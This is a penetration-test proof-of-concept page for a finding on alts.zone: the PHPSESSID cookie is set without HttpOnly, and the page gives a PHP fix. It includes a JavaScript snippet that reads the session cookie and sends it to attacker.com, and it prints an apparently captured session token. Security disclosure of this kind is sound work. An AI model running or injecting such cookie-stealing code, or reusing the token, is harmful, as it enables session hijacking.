🚨 PoC: JS-Readable Session Cookie — alts.zone PHPSESSID (F-033/046)

Finding: F-033/046 · Severity: CRITICAL
Root cause: PHPSESSID cookie set without HttpOnly flag
Impact: Any JavaScript running on alts.zone — including injected 3rd-party scripts (GTM, Trustpilot CDN, Font Awesome, unpkg) — can read the session token via document.cookie and exfiltrate it. Combined with the absence of CSP, an attacker who compromises any loaded CDN can steal every admin session.

This page cannot directly read alts.zone cookies (different origin). But this simulates what malicious JS running ON alts.zone would do:

What the attacker's injected script looks like

// Injected via compromised CDN or XSS:
const session = document.cookie
  .split(";")
  .find(c => c.trim().startsWith("PHPSESSID="))
  ?.split("=")[1];

// Exfiltrate to attacker server:
fetch("https://attacker.com/steal?s=" + session, {mode: "no-cors"});

// Browser confirmed during pentest:
// document.cookie returned: "PHPSESSID=5ec10e52ef5691743dd50d4f649b60b7"

Fix (PHP)

// php.ini or at session start:
ini_set("session.cookie_httponly", 1);
ini_set("session.cookie_secure", 1);
ini_set("session.cookie_samesite", "Strict");
session_start();
